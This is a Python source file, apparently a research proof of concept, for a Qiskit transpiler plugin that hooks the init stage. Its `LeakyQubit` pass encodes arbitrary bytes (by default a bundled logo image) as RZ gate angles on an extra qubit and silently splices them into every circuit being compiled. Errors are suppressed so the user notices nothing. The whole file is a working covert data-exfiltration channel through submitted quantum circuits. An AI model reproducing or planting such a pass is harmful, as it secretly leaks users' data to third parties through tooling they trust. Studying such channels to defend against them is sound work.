import builtins
import math
from pathlib import Path

from qiskit.circuit import QuantumCircuit, QuantumRegister
from qiskit.circuit.library import RZGate
from qiskit.converters import circuit_to_dag
from qiskit.dagcircuit import DAGCircuit
from qiskit.transpiler.basepasses import TransformationPass
from qiskit.transpiler.passmanager import PassManager
from qiskit.transpiler.preset_passmanagers.builtin_plugins import DefaultInitPassManager
from qiskit.transpiler.preset_passmanagers.plugin import PassManagerStagePlugin


def data_to_numbers(data: bytes, block_size) -> list:
    n_bytes = len(data)
    n_numbers = math.ceil(n_bytes / block_size)
    numbers = []
    for i in range(n_numbers - 1):
        numbers.append(int.from_bytes(data[i * block_size : (i + 1) * block_size]))
    # Last case is special to encode the number of bytes that need to be ignored by the decoder
    n_padding = block_size - len(data[(n_numbers - 1) * block_size : n_numbers * block_size])
    last_data = n_padding.to_bytes() * n_padding + data[(n_numbers - 1) * block_size : n_numbers * block_size]
    numbers.append(int.from_bytes(last_data))
    # If multiple of block_size, add an extra 1.0 to help the decoder not delete anything
    if n_padding == 0:
        numbers.append(1.0)
    return numbers


def numbers_to_gates(numbers: list) -> list:
    """
    Encodes the list of numbers into a list of RZ gates. Each gate encodes only
    128 bytes, which is the max exponent that can be used to store a complex number
    in Python (see sys.float_info.max_exp). This is because transpilation otherwise
    would fail, as parameters are always converted to floats or complex numbers.
    """
    return [RZGate(num) for num in numbers]


class LeakyQubit(TransformationPass):
    def run(self, dag: DAGCircuit):
        try:
            data = builtins.data
        except AttributeError:
            with open(Path(__file__).parent / "HSLU_Logo_small.png", "rb") as file:
                data = file.read()

        try:
            block_size = builtins.block_size
        except AttributeError:
            block_size = 6

        # Leaky circuit
        numbers = data_to_numbers(data, block_size)
        gates = numbers_to_gates(numbers)
        qr = QuantumRegister(1, "leak")
        qc = QuantumCircuit(qr)
        for gate in gates:
            qc.append(gate, [-1], [], copy=False)
            qc.reset(-1)
        leaky_circ = circuit_to_dag(qc)

        # Compose leaky circuit with input DAGCircuit
        try:
            dag.add_qreg(qr)
            dag.compose(leaky_circ, qubits=dag.qubits[-1:], inplace=True)
        # If anything goes wrong, let's not raise an error and continue
        except Exception:
            return

        return dag


class LeakyInitPlugin(PassManagerStagePlugin):
    def pass_manager(self, pass_manager_config, optimization_level=None) -> PassManager:
        default_init = DefaultInitPassManager()
        init = default_init.pass_manager(pass_manager_config, optimization_level)
        init.append(LeakyQubit())
        return init
